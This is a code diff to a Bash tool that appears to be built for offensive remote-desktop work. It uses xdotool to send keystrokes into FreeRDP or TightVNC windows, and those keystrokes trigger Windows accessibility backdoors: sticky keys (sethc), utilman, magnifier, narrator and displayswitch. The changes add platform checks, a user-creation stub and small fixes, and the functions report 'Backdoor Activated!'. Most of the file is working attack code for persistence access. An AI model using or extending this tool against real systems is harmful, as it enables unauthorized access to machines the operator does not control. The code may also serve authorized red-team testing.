@@ -4,13 +4,23 @@ function check_dependencies() {
     if ! which xdotool &>/dev/null
     then
         echo "[!] Installing missing dependency..."
-        sudo apt install -y xdotool
+        if [[ ! $(which sudo 2>/dev/null) || $UID -ne 0 ]]
+        then
+            apt install -y xdotool
+        else
+            sudo apt install -y xdotool
+        fi
         exit 1
     fi
 }
 
-function print_status {
+function color_print {
+    local message=
     # TODO: Add colors
+    # [*] for blue
+    # [+] for green
+    # [!] for yellow
+    # white to reset colors
     echo ""
 }
 
@@ -146,22 +156,53 @@ function OutputRemoteFile {
     esac
 }
 
+function CreateUser {
+    platform=$1
+    # TODO: Print out information with commands to instruct the user both commands and cmdlet
+    # Add a cleanup method
+    echo "Not implemented"
+}
+
 function StickyKey {
-    # TODO: Add a cleanup method
+    platform=$1
+    # TODO: Print out information with commands to instruct the user both commands and cmdlet
+    # Add a cleanup method
+    if [ $platform != "windows" ]
+    then
+        echo "[!] Registry keys only exists on Windows operating system user!"
+        exit 1
+    fi
+
     echo "[*] Activating sethc.exe (sticky keys) backdoor..."
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key shift shift shift shift shift
     echo "[+] Backdoor Activated!"
 }
 
 function UtilityManager {
-    # TODO: Add a cleanup method
+    platform=$1
+    # TODO: Print out information with commands to instruct the user both commands and cmdlet
+    # Add a cleanup method
+    if [ $platform != "windows" ]
+    then
+        echo "[!] Registry keys only exists on Windows operating system user!"
+        exit 1
+    fi
+
     echo "[*] Activating utilman.exe (utility manager) backdoor..."
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+u
     echo "[+] Backdoor Activated!"
 }
 
 function Magnifier {
-    # TODO: Add a cleanup method
+    platform=$1
+    # TODO: Print out information with commands to instruct the user both commands and cmdlet
+    # Add a cleanup method
+    if [ $platform != "windows" ]
+    then
+        echo "[!] Registry keys only exists on Windows operating system user!"
+        exit 1
+    fi
+
     echo "[*] Activating magnifier.exe backdoor..."
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+equal
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+minus
@@ -169,14 +210,30 @@ function Magnifier {
 }
 
 function Narrator {
-    # TODO: Add a cleanup method
+    platform=$1
+    # TODO: Print out information with commands to instruct the user both commands and cmdlet
+    # Add a cleanup method
+    if [ $platform != "windows" ]
+    then
+        echo "[!] Registry keys only exists on Windows operating system user!"
+        exit 1
+    fi
+
     echo "[*] Activating narrator.exe backdoor..."
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+Return
     echo "[+] Backdoor Activated!"
 }
 
 function DisplaySwitch {
-    # TODO: Add a cleanup method
+    platform=$1
+    # TODO: Print out information with commands to instruct the user both commands and cmdlet
+    # Add a cleanup method
+    if [ $platform != "windows" ]
+    then
+        echo "[!] Registry keys only exists on Windows operating system user!"
+        exit 1
+    fi
+
     echo "[*] Activating displayswitch.exe backdoor..."
     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+p
     echo "[+] Backdoor Activated!"
@@ -184,23 +241,24 @@ function DisplaySwitch {
 
 function Persistence {
     local persistence_method=$1
+    local platform=$2
     # TODO: Fill in the rest of the persistence methods
     # Add a -b, --backdoor flag
     case $persistence_method in
         sethc)
-            StickyKey
+            StickyKey $platform
             ;;
         utilman)
-            UtilityManager
+            UtilityManager $platform
             ;;
         magnifier)
-            Magnifier
+            Magnifier $platform
             ;;
         narrator)
-            Narrator
+            Narrator $platform
             ;;
         displayswitch)
-            DisplaySwitch
+            DisplaySwitch $platform
             ;;
         *)
             echo "Invalid Persistence Technique!" >&2
@@ -301,7 +359,7 @@ function main() {
         exit 1
     fi
 
-    # Matches the window name
+    # Select Remote Desktop Program to match the window name
     if [ "$WINDOWNAME" = "freerdp" ]
     then
         WINDOWNAME="FreeRDP"
@@ -313,7 +371,7 @@ function main() {
         WINDOWNAME="TightVNC"
     fi
 
-    # Selecting operating system
+    # Select operating system
     if [ -z "$PLATFORM" ]
     then
         PLATFORM="windows"
